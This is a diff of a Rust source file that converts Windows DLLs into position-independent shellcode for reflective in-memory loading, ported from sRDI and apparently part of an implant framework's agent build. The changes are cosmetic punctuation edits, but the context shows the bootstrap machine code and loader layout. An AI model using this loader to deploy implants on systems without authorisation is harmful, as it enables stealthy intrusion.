@@ -1,11 +1,11 @@
 // src/shellcode.rs
 //
-// PE (DLL) → position-independent shellcode conversion, sRDI-style.
+// PE (DLL) -> position-independent shellcode conversion, sRDI-style.
 //
 // The output blob layout is:
 //
 //   ┌─────────────────────┬──────────────────┬─────────────┬───────────┐
-//   │ bootstrap (69 bytes)│ RDI loader stub  │ raw DLL     │ user data │
+//   │ bootstrap (69 bytes)│ RDI loader stub │ raw DLL │ user data │
 //   └─────────────────────┴──────────────────┴─────────────┴───────────┘
 //
 // At runtime the bootstrap captures its own RIP, sets up the Win64
@@ -19,20 +19,20 @@
 //
 // The conversion algorithm is a Rust port of sRDI's ConvertToShellcode
 // (https://github.com/monoxgas/sRDI, BSD 3-Clause). Only 64-bit DLLs are
-// supported — the project's Windows agents are built for
+// supported - the project's Windows agents are built for
 // x86_64-pc-windows-gnu, so a 32-bit path would be dead code.
 
 use std::fmt;
 
 use crate::rdi_stub::RDI_STUB_X64;
 
-/// Hash value the RDI stub interprets as "do not call any export —
+/// Hash value the RDI stub interprets as "do not call any export -
 /// DllMain did all the work". Matches sRDI's convention.
 pub const DEFAULT_FUNCTION_HASH: u32 = 0x10;
 
 /// Exact size of the x64 bootstrap built below. The stub call inside the
 /// bootstrap is RIP-relative, so a wrong size silently corrupts the jump
-/// target — assert on it at construction time and in tests.
+/// target - assert on it at construction time and in tests.
 pub const BOOTSTRAP_SIZE_X64: usize = 69;
 
 /// Length of the embedded x64 RDI loader stub in bytes.
@@ -160,7 +160,7 @@ pub fn convert_dll_to_shellcode(
         BOOTSTRAP_SIZE_X64 + RDI_STUB_X64.len() + dll.len() + opts.user_data.len(),
     );
 
-    // call $+5 — pushes RIP of the following instruction onto the stack
+    // call $+5 - pushes RIP of the following instruction onto the stack
     b.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]);
 
     // Offset from the pop below to the DLL image:
@@ -168,7 +168,7 @@ pub fn convert_dll_to_shellcode(
     let dll_offset = (BOOTSTRAP_SIZE_X64 - b.len() + RDI_STUB_X64.len()) as u32;
     let user_data_location = dll_offset + dll.len() as u32;
 
-    b.push(0x59); // pop rcx — rcx = current RIP (shellcode base)
+    b.push(0x59); // pop rcx - rcx = current RIP (shellcode base)
 
     b.extend_from_slice(&[0x49, 0x89, 0xC8]); // mov r8, rcx
 
@@ -181,7 +181,7 @@ pub fn convert_dll_to_shellcode(
     b.extend_from_slice(&[0x41, 0xB9]); // mov r9d, <user data length>
     b.extend_from_slice(&(opts.user_data.len() as u32).to_le_bytes());
 
-    b.push(0x56); // push rsi — preserve
+    b.push(0x56); // push rsi - preserve
     b.extend_from_slice(&[0x48, 0x89, 0xE6]); // mov rsi, rsp
     b.extend_from_slice(&[0x48, 0x83, 0xE4, 0xF0]); // and rsp, -16
     b.extend_from_slice(&[0x48, 0x83, 0xEC, 0x30]); // sub rsp, 0x30 (shadow space + args)
@@ -194,7 +194,7 @@ pub fn convert_dll_to_shellcode(
     b.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20]); // mov dword [rsp+0x20], <flags> (arg6)
     b.extend_from_slice(&opts.flags.to_le_bytes());
 
-    b.push(0xE8); // call <RDI stub> — RIP-relative, target = BOOTSTRAP_SIZE_X64
+    b.push(0xE8); // call <RDI stub> - RIP-relative, target = BOOTSTRAP_SIZE_X64
     let rel = (BOOTSTRAP_SIZE_X64 as i32) - (b.len() as i32) - 4;
     b.extend_from_slice(&rel.to_le_bytes());
 
@@ -295,7 +295,7 @@ mod tests {
     use super::*;
 
     /// Minimal structurally-valid x64 DLL header (512 bytes of mostly
-    /// zeros — conversion never maps sections, it only ships the bytes).
+    /// zeros - conversion never maps sections, it only ships the bytes).
     fn fake_dll(size: usize) -> Vec<u8> {
         let mut d = vec![0u8; size.max(512)];
         d[0] = b'M';
@@ -346,7 +346,7 @@ mod tests {
         let dll_offset = (BOOTSTRAP_SIZE_X64 - 5 + RDI_STUB_X64.len()) as u32; // 2836
         let user_data_loc = dll_offset + dll.len() as u32;
 
-        // mov edx, hash  (offset 9: opcode BA at 9, imm at 10)
+        // mov edx, hash (offset 9: opcode BA at 9, imm at 10)
         assert_eq!(sc[9], 0xBA);
         assert_eq!(read_u32_le(&sc, 10), Some(0x41424344));
 
